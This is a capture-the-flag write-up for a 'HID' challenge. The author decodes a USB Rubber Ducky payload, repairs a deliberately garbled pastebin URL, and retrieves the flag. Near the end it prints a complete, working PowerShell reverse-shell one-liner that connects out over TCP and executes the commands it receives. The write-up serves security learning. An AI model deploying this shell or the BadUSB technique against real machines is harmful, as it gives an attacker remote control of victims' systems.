# HID

![Category](http://img.shields.io/badge/Category-Wednesday-orange?style=for-the-badge) ![Points](http://img.shields.io/badge/Points-300-brightgreen?style=for-the-badge)

![Tag](https://img.shields.io/badge/Tag-binary_analysis-blue?style=plastic)

## Details
***One of my colleagues found a USB stick in the parking lot in front of our company. Fortunately he handed it over directly to us . The drive contains an SD card with just one file. Maybe it's no normal USB flash drive?***


Firstly I started by going to "ducktoolkit.com" ![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_url.png)

I chose the **Decode Payload** option ![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder.png)

I uploaded the file from my downloads folder [inject.bin] and then clicked **Decode** ![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_upload.png)

Once it had uploaded and the page refreshed i chose the option to Download [duckycode.txt] ![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_download.png)

I opened up the [duckycode.txt] in Pluma and scrolled through the code and found a download string to a pastebin which looked suspicious\
![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_string.png)

I changed the incorrect character to look like a normal URL - https://pastebin.com/raw/YRD8jsvd and went to the website to see what was there.

![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_404.png)

I received a 404 error.

I went back over the code and noticed more spelling mistakes or letters that were in the wrong place. Like the below:-

![Image](https://github.com/CTSecUK/Syskron-Security-CTF-2020/blob/main/Write-ups/images/HID_ducky_decoder_characters.png)

**Copz and yip** stood out to me so I modified the URL, swapping Y to Z and tried that URL in the address bar - https://pastebin.com/raw/ZRD8jsvd

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10syskronCTF{y0u_f0und_m3}",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
The flag was hidden in the hostname/IP-address field.

Flag: ***syskronCTF{y0u_f0und_m3}***
